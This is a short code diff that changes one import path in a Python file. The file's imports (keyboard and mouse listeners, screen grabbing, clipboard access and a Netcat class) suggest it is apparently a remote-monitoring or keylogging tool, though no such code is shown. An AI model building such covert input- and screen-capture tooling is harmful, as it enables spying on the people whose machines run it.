@@ -4,7 +4,7 @@ import pyautogui
 import threading
 from os import name
 from PIL import ImageGrab
-from src.Netcat import Netcat
+from Netcat import Netcat
 import time
 from pynput import keyboard, mouse
 import pyperclip
